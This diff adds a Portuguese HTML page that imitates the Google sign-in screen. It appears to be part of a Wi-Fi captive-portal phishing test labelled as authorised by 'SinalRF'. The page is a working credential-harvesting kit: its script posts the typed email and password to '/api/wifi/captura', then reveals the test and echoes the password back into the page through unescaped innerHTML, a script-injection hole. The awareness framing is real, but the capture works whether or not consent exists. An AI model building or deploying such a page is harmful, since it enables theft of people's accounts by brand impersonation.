@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fazer login nas Contas do Google</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:Roboto,Arial,sans-serif}
+  body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{border:1px solid #dadce0;border-radius:8px;max-width:400px;width:100%;padding:40px 32px;text-align:center}
+  .logo{font-size:26px;font-weight:500;margin-bottom:14px}
+  .logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}
+  .logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}
+  .logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
+  h1{font-size:22px;font-weight:400;color:#202124;margin-bottom:6px}
+  p{color:#202124;font-size:15px;margin-bottom:24px}
+  input{width:100%;padding:13px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:15px}
+  button{float:right;padding:10px 24px;margin-top:16px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
+  .reveal{display:none}.reveal.on{display:block}
+  .warn{font-size:50px}.reveal h1{color:#c0392b}
+  .cap{background:#fff3f3;border:1px solid #ffd0d0;border-radius:8px;padding:12px;margin:14px 0;text-align:left;font-size:13px;color:#900;word-break:break-all}
+  .footer{position:fixed;bottom:8px;left:0;right:0;text-align:center;font-size:10px;color:#bbb}
+</style>
+</head>
+<body>
+  <div class="box" id="form">
+    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+    <h1>Fazer login</h1>
+    <p>Use sua Conta do Google</p>
+    <form onsubmit="enviar(event)">
+      <input type="email" id="usuario" placeholder="E-mail ou telefone" required>
+      <input type="password" id="senha" placeholder="Senha" required>
+      <button type="submit">Próxima</button>
+    </form>
+  </div>
+
+  <div class="box reveal" id="reveal">
+    <div class="warn">⚠️</div>
+    <h1>Isto foi um teste de phishing</h1>
+    <p>Esta página falsa imitava o login do Google. Num ataque real, sua senha já teria sido capturada.</p>
+    <div class="cap" id="capBox"></div>
+    <p style="font-size:12px">Cheque sempre o endereço (URL) e ative a verificação em duas etapas.</p>
+  </div>
+
+  <div class="footer">Teste de segurança autorizado · SinalRF · não afiliado ao Google</div>
+<script>
+async function enviar(e){
+  e.preventDefault();
+  const u=document.getElementById('usuario').value, s=document.getElementById('senha').value;
+  try{ await fetch('/api/wifi/captura',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({portal:'google',campos:{usuario:u,senha:s}})}); }catch{}
+  document.getElementById('capBox').innerHTML='Você enviou:<br>usuário: <b>'+u+'</b><br>senha: <b>'+s+'</b>';
+  document.getElementById('form').style.display='none';
+  document.getElementById('reveal').classList.add('on');
+}
+</script>
+</body>
+</html>
